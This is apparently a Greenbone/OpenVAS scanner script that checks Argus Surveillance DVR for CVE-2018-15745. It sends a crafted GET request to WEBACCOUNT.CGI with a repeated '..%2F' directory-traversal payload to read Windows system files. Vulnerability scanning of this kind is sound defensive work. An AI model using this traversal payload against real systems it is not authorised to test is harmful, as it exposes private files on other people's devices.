CPE = "cpe:/a:argus_surveillance:dvr";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141409" );
	script_version( "2021-06-24T11:00:30+0000" );
	script_tag( name: "last_modification", value: "2021-06-24 11:00:30 +0000 (Thu, 24 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-08-29 14:19:28 +0700 (Wed, 29 Aug 2018)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-12-07 18:23:00 +0000 (Fri, 07 Dec 2018)" );
	script_cve_id( "CVE-2018-15745" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Argus Surveillance DVR Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_argus_surveillance_dvr_detect.sc" );
	script_mandatory_keys( "argus_surveillance/installed" );
	script_tag( name: "summary", value: "Argus Surveillance DVR is prone to multiple vulnerabilities." );
	script_tag( name: "insight", value: "Argus Surveillance DVR is prone to multiple vulnerabilities:

  - Directory traversal (CVE-2018-15745)

  - SYSTEM privilege escalation" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_xref( name: "URL", value: "http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-UNAUTHENTICATED-PATH-TRAVERSAL-FILE-DISCLOSURE.txt" );
	script_xref( name: "URL", value: "http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-SYSTEM-PRIVILEGE-ESCALATION.txt" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	url = "/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=" + crap( data: "..%2F", length: 16 * 5 ) + files[file] + "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=";
	if(http_vuln_check( port: port, url: url, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

